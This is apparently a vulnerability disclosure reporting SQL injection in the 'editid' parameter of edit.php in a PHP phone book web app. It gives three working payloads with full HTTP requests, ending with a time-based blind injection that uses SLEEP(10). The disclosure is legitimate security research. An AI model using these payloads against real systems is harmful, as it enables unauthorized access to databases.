# Simple Phone book/directory Web App v1.0 by bakhtiar has SQL injection

BUG_Author: realguoxiufeng

vendors:https://www.sourcecodester.com/php/13011/phone-bookphone-directory.html

Vulnerability File: /PhoneBook/edit.php

GET parameter 'editid' exists SQL injection vulnerability

Payload1: /PhoneBook/edit.php?editid=1'

```
GET /PhoneBook/edit.php?editid=1' HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close
```

sql statement error

![image](https://github.com/realguoxiufeng/pic/blob/main/err.png)

Payload2: /PhoneBook/edit.php?editid=1''

```
GET /PhoneBook/edit.php?editid=1'' HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close
```

Page successfully displayed

![image](https://github.com/realguoxiufeng/pic/blob/main/righ.png)

Payload3: /PhoneBook/edit.php?editid=1%27%20AND%20(SELECT%202%20FROM%20(SELECT(SLEEP(10)))A)--%20B

```
GET /PhoneBook/edit.php?editid=1%27%20AND%20(SELECT%202%20FROM%20(SELECT(SLEEP(10)))A)--%20B HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close
```

The server's response time is 10 seconds

![image](https://github.com/realguoxiufeng/pic/blob/main/sle.png)
